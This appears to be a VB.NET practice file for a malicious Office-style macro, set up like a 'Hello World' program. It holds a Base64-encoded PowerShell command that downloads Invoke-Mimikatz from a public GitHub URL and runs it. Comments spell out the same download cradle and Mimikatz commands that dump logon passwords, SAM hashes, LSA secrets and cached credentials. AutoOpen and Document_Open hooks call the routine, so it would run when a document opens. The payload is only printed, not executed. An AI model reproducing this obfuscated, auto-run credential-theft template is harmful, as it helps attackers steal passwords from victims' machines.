Imports System

Module Program
    Sub Main(args As String())
        Console.WriteLine("Hello World!")

        Dim prueba = "Esto es una prueba"

        Dim test = "SG9sYSBxdWUgdGFs"
        Dim saluda = db64(test)
        Console.WriteLine(saluda)

        Dim elliot = "cG93ZXJzaGVsbCAiSUVYIChOZXctT2JqZWN0IE5ldC5XZWJDbGllbnQpLkRvd25sb2FkU3RyaW5nICgnaHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL1Bvd2VyU2hlbGxNYWZpYS9Qb3dlclNwbG9pdC9tYXN0ZXIvRXhmaWx0cmF0aW9uL0ludm9rZS1NaW1pa2F0ei5wczEnKTtJbnZva2UtTWltaWthdHoiIA=="

        Console.WriteLine(db64(elliot))

    End Sub

    Sub mrrobot()

        'Decode Base64
        'IEX (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/clymb3r/PowerShell/master/Invoke-Mimikatz/Invoke-Mimikatz.ps1')
        'Invoke-Mimikatz - DumpCreds #Dump creds from memory
        'Invoke-Mimikatz - Command() '"privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::lsa /inject" "lsadump::sam" "lsadump::cache" "sekurlsa::ekeys" "exit"'



    End Sub

    Sub AutoOpen()
        mrrobot()
    End Sub

    Sub Document_Open()
        mrrobot()
    End Sub

    Public Function db64(input As String) As String
        Return System.Text.Encoding.UTF8.GetString(Convert.FromBase64String(input))
    End Function



End Module
